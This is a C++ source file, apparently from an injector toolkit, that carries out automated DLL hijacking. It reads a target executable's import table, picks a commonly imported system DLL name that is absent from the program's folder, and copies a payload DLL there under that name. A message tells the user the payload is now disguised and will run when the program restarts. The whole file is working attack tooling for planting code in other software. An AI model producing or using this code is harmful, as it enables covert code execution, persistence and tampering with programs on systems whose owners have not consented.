/**
 * 文件名: src/methods/method_hijack.cpp
 * 作用: 实现智能 DLL 劫持
 * 修复: 解决了 'jump to label crosses initialization' 编译错误
 * (将变量声明提前到 goto 之前)
 */

#include "injector_methods.h"
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <set>
#include <shlwapi.h> // PathRemoveFileSpec

#pragma comment(lib, "shlwapi.lib")

namespace methods {

    const std::vector<std::wstring> HIJACK_CANDIDATES = {
        L"version.dll",
        L"winmm.dll",
        L"dwmapi.dll",
        L"uxtheme.dll",
        L"dbghelp.dll",
        L"wtsapi32.dll",
        L"cryptbase.dll",
        L"userenv.dll"
    };

    std::wstring GetDirectoryFromPath(const std::wstring& path) {
        wchar_t buffer[MAX_PATH];
        wcscpy_s(buffer, path.c_str());
        PathRemoveFileSpecW(buffer);
        return std::wstring(buffer);
    }

    DWORD RvaToOffset(DWORD rva, PIMAGE_SECTION_HEADER pSections, WORD nSections) {
        for (WORD i = 0; i < nSections; i++) {
            if (rva >= pSections[i].VirtualAddress && 
                rva < pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize) {
                return rva - pSections[i].VirtualAddress + pSections[i].PointerToRawData;
            }
        }
        return 0;
    }

    std::set<std::wstring> GetImportedDlls(const std::wstring& exePath) {
        std::set<std::wstring> imports;
        
        // 变量提前声明 (修复 goto 报错)
        PIMAGE_DOS_HEADER pDos = nullptr;
        PIMAGE_NT_HEADERS pNt = nullptr;
        DWORD importRva = 0;
        PIMAGE_SECTION_HEADER pSections = nullptr;
        WORD nSections = 0;
        DWORD importOffset = 0;
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = nullptr;

        HANDLE hFile = CreateFileW(exePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return imports;

        HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!hMap) { CloseHandle(hFile); return imports; }

        LPVOID pBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
        if (!pBase) { CloseHandle(hMap); CloseHandle(hFile); return imports; }

        // 开始解析
        pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) goto Cleanup;

        pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) goto Cleanup;

        // 获取 Section 信息
        pSections = IMAGE_FIRST_SECTION(pNt);
        nSections = pNt->FileHeader.NumberOfSections;

        // 获取导入表 RVA
        if (pNt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            PIMAGE_NT_HEADERS64 pNt64 = (PIMAGE_NT_HEADERS64)pNt;
            importRva = pNt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        } else {
            PIMAGE_NT_HEADERS32 pNt32 = (PIMAGE_NT_HEADERS32)pNt;
            importRva = pNt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        }

        if (importRva == 0) goto Cleanup;

        // RVA 转 Offset
        importOffset = RvaToOffset(importRva, pSections, nSections);
        if (importOffset == 0) goto Cleanup;

        // 遍历导入表
        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pBase + importOffset);
        while (pImportDesc->Name != 0) {
            DWORD nameOffset = RvaToOffset(pImportDesc->Name, pSections, nSections);
            if (nameOffset != 0) {
                char* pName = (char*)((BYTE*)pBase + nameOffset);
                int len = MultiByteToWideChar(CP_ACP, 0, pName, -1, NULL, 0);
                if (len > 0) {
                    std::vector<wchar_t> wName(len);
                    MultiByteToWideChar(CP_ACP, 0, pName, -1, wName.data(), len);
                    std::wstring dllName = wName.data();
                    std::transform(dllName.begin(), dllName.end(), dllName.begin(), ::towlower);
                    imports.insert(dllName);
                }
            }
            pImportDesc++;
        }

    Cleanup:
        if (pBase) UnmapViewOfFile(pBase);
        if (hMap) CloseHandle(hMap);
        if (hFile) CloseHandle(hFile);
        return imports;
    }

    bool Deploy_Hijack(const std::wstring& targetExePath, const std::wstring& myDllPath) {
        
        std::wstring targetDir = GetDirectoryFromPath(targetExePath);
        if (targetDir.empty()) {
            MessageBoxW(NULL, L"无法解析目标目录", L"错误", MB_ICONERROR);
            return false;
        }

        std::wcout << L"[*] 正在分析目标导入表: " << targetExePath << std::endl;
        
        std::set<std::wstring> importedDlls = GetImportedDlls(targetExePath);
        std::wstring bestCandidate = L"";

        for (const auto& candidate : HIJACK_CANDIDATES) {
            if (importedDlls.count(candidate)) {
                std::wstring checkPath = targetDir + L"\\" + candidate;
                DWORD attr = GetFileAttributesW(checkPath.c_str());
                if (attr == INVALID_FILE_ATTRIBUTES) {
                    bestCandidate = candidate;
                    break;
                }
            }
        }

        if (bestCandidate.empty()) {
            std::cout << "[!] 未找到最佳劫持目标，尝试默认目标 version.dll" << std::endl;
            bestCandidate = L"version.dll";
        }

        std::wcout << L"[+] 选定劫持目标: " << bestCandidate << std::endl;

        std::wstring hijackPath = targetDir + L"\\" + bestCandidate;
        
        if (GetFileAttributesW(hijackPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            MessageBoxW(NULL, L"目标目录下已存在同名文件，停止劫持以策安全。", L"错误", MB_ICONERROR);
            return false;
        }

        if (CopyFileW(myDllPath.c_str(), hijackPath.c_str(), FALSE)) {
            std::wstring msg = L"劫持成功！\n\nPayload 已伪装成: " + bestCandidate + L"\n请重启目标程序生效。";
            MessageBoxW(NULL, msg.c_str(), L"部署完成", MB_ICONINFORMATION);
            return true;
        } else {
            MessageBoxW(NULL, L"文件复制失败 (权限不足？)", L"错误", MB_ICONERROR);
            return false;
        }
    }
}